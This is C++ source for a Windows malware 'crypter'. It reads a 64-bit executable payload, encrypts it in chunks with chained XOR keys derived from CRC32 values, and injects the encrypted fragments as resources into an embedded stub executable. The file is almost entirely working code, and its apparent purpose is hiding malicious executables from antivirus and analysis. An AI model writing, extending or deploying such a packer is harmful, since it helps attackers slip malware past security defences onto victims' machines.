#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>
#include "stub_bytes.h"
#include <cstdint>
#include <algorithm>  // for std::min
using namespace std;


// ============================================================================
// STRUCTURES
// ============================================================================
#pragma pack(push, 1)
struct ChunkHeader {
    char magic[4];           // "FRAG"
    uint32_t total_size;
    uint16_t total_chunks;
    uint16_t chunk_size;
    uint8_t encryption_key;  // ONLY the first key now
    uint32_t crc32;
    char marker[8];          // "CHUNK001"
};
#pragma pack(pop)

// ============================================================================
// FORWARD DECLARATIONS
// ============================================================================
bool ReadPayloadFile(const char* filename, char** buffer, long* size);
bool ValidatePEArchitecture(char* fileBuffer);
void DisplayChunkInfo(long fileSize, int chunkSize);
bool WriteStubToFile();
bool FragmentAndInjectPayloadChained(const std::vector<std::vector<char>>& encrypted_chunks, long payloadSize, int chunkSize, uint8_t first_key);
void CleanupResources(char* fileBuffer);
uint32_t CalculateCRC32(const char* data, size_t length);

// Global so header can use it
char* fileBuffer = nullptr;  // original payload (plain)

// ============================================================================
// CHAINED ENCRYPTION
// ============================================================================
std::vector<std::vector<char>> EncryptPayloadChained(const char* payload, long size, uint8_t first_key)
{
    const int CHUNK_SIZE = 4096;
    int totalChunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
    std::vector<std::vector<char>> encrypted_chunks(totalChunks);

    uint8_t current_key = first_key;

    for (int i = 0; i < totalChunks; i++) {
        int chunk_start = i * CHUNK_SIZE;
        int chunk_len = std::min(CHUNK_SIZE, (int)(size - chunk_start));

        std::vector<char> plain_chunk(payload + chunk_start, payload + chunk_start + chunk_len);
        std::vector<char>& encrypted_chunk = encrypted_chunks[i];
        encrypted_chunk.resize(chunk_len);

        for (int j = 0; j < chunk_len; j++) {
            encrypted_chunk[j] = plain_chunk[j] ^ current_key;
        }

        cout << "[+] Chunk " << i << " encrypted with key 0x" << hex << (unsigned int)current_key << dec << endl;

        if (i < totalChunks - 1) {
            uint32_t crc = CalculateCRC32(plain_chunk.data(), plain_chunk.size());
            current_key = (uint8_t)(crc ^ (crc >> 8) ^ (crc >> 16) ^ (crc >> 24));
        }
    }
    return encrypted_chunks;
}

// ============================================================================
// INJECT CHAINED CHUNKS
// ============================================================================
bool FragmentAndInjectPayloadChained(const std::vector<std::vector<char>>& encrypted_chunks, long payloadSize, int chunkSize, uint8_t first_key)
{
    HANDLE hUpdate = BeginUpdateResourceA("Stub.exe", FALSE);
    if (!hUpdate) {
        cerr << "[-] BeginUpdateResource failed" << endl;
        return false;
    }

    int totalChunks = (int)encrypted_chunks.size();

    ChunkHeader header{};
    memcpy(header.magic, "FRAG", 4);
    header.total_size = payloadSize;
    header.total_chunks = totalChunks;
    header.chunk_size = chunkSize;
    header.encryption_key = first_key;
    header.crc32 = CalculateCRC32(fileBuffer, payloadSize);
    memcpy(header.marker, "CHUNK001", 8);

    // Chunk 0: header + encrypted data
    const auto& chunk0 = encrypted_chunks[0];
    std::vector<char> chunk0_blob(sizeof(header) + chunk0.size());
    memcpy(chunk0_blob.data(), &header, sizeof(header));
    memcpy(chunk0_blob.data() + sizeof(header), chunk0.data(), chunk0.size());

    if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(132),
        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
        chunk0_blob.data(), (DWORD)chunk0_blob.size())) {
        EndUpdateResource(hUpdate, TRUE);
        return false;
    }

    // Other chunks
        // All other chunks
    for (int i = 1; i < totalChunks; i++) {
        int resId = 132 + i;
        const auto& data = encrypted_chunks[i];
        if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(resId),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
            (LPVOID)data.data(), (DWORD)data.size())) {  // ← fixed here
            cerr << "[-] Failed to update resource ID " << resId << endl;
            EndUpdateResource(hUpdate, TRUE);
            return false;
        }
    }
    if (!EndUpdateResource(hUpdate, FALSE)) {
        cerr << "[-] EndUpdateResource failed" << endl;
        return false;
    }

    std::cout << "[+] Successfully injected " << totalChunks << " chained-encrypted chunks!" << endl;
    return true;
}

// ============================================================================
// MAIN
// ============================================================================
int main(int argc, char* argv[])
{
    if (argc < 2) {
        cout << "Usage: crypter.exe <payload.exe>" << endl;
        system("pause");
        return 1;
    }

    const char* payloadFilename = argv[1];
    long fileSize = 0;
    const int CHUNK_SIZE = 4096;
    const uint8_t FIRST_KEY = 0x5B;

    cout << "[*] Reading payload..." << endl;
    if (!ReadPayloadFile(payloadFilename, &fileBuffer, &fileSize)) return 1;

    cout << "[+] Payload size: " << fileSize << " bytes" << endl;

    if (!ValidatePEArchitecture(fileBuffer)) {
        CleanupResources(fileBuffer);
        return 1;
    }

    DisplayChunkInfo(fileSize, CHUNK_SIZE);

    cout << "[*] Encrypting with chained XOR (key starts 0x5B)" << endl;
    auto encrypted_chunks = EncryptPayloadChained(fileBuffer, fileSize, FIRST_KEY);

    cout << "[*] Writing stub..." << endl;
    if (!WriteStubToFile()) {
        CleanupResources(fileBuffer);
        return 1;
    }

    cout << "[*] Injecting fragments..." << endl;
    if (!FragmentAndInjectPayloadChained(encrypted_chunks, fileSize, CHUNK_SIZE, FIRST_KEY)) {
        CleanupResources(fileBuffer);
        return 1;
    }

    cout << "\n[SUCCESS] All done! Stub.exe ready with chained encryption.\n" << endl;

    CleanupResources(fileBuffer);
    system("pause");
    return 0;
}

// ============================================================================
// REST OF YOUR OLD FUNCTIONS (unchanged)
// ============================================================================
bool ReadPayloadFile(const char* filename, char** buffer, long* size) {
    FILE* file = fopen(filename, "rb");
    if (!file) { cerr << "[-] Can't open file" << endl; return false; }
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    rewind(file);
    *buffer = (char*)malloc(*size);
    if (!*buffer) { fclose(file); return false; }
    fread(*buffer, 1, *size, file);
    fclose(file);
    return true;
}

bool ValidatePEArchitecture(char* fileBuffer) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)fileBuffer;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(fileBuffer + dos->e_lfanew);
    return nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
}

void DisplayChunkInfo(long fileSize, int chunkSize) {
    int total = (fileSize + chunkSize - 1) / chunkSize;
    cout << "\n=== Will create " << total << " chunks ===\n" << endl;
}

bool WriteStubToFile() {
    ofstream file("Stub.exe", ios::binary);
    if (!file.write((char*)Stub_exe, Stub_exe_len)) return false;
    cout << "[+] Stub.exe written" << endl;
    return true;
}

uint32_t CalculateCRC32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

void CleanupResources(char* fileBuffer) {
    if (fileBuffer) free(fileBuffer);
}